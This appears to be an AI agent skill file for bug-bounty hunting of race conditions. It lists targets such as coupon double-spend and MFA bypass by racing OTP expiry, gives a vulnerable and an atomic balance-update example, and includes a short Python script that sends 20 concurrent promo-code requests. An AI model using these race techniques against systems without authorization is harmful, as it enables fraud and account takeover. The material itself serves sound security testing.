---
name: hunt-race
description: "Hunt race conditions and TOCTOU bugs — bugs that fire only when 2+ concurrent requests land within a small time window. Patterns: double-spend (coupon redeemed twice, balance debited once), referral payout multiplier (refer self N times concurrently), file upload race (path generated then validated then written), session race (login + delete account concurrent), checkout race (cart total computed → payment captured with modified cart), MFA-bypass-via-race (race the OTP-validate against expiry). Tooling: Burp Turbo Intruder single-packet attack, h2.cl smuggling for atomic submit, parallel curl with --next. Detection: every endpoint that mutates state under a uniqueness constraint is a candidate. Validate: 1 successful + N duplicate / over-quota / stale-state demonstrations. Real paid examples (coupon, gift-card, account-create, MFA bypass). Use when hunting concurrency bugs, double-spend, balance manipulation, MFA-bypass-via-timing."
---

## 6. RACE CONDITIONS

### Classic Double-Spend
```python
# VULNERABLE
def spend_credit(user_id, amount):
    balance = get_balance(user_id)    # CHECK
    if balance >= amount:
        deduct(user_id, amount)       # USE — gap here

# SECURE (atomic)
rows = db.execute("UPDATE balances SET amount=amount-? WHERE user_id=? AND amount>=?",
                  amount, user_id, amount)
if rows == 0: raise InsufficientBalance()
```

### Testing
```bash
# Turbo Intruder (Burp) with Last-Byte Sync
# Python parallel
import threading, requests
threads = [threading.Thread(target=lambda: requests.post(url, json={'code':'PROMO123'},
           headers={'Authorization': f'Bearer {token}'})) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

### Race Targets
- Coupon/promo code redemption
- Gift card / credit spending
- Limited stock purchase
- Rate limit bypass (send before counter increments)
- Email verification token


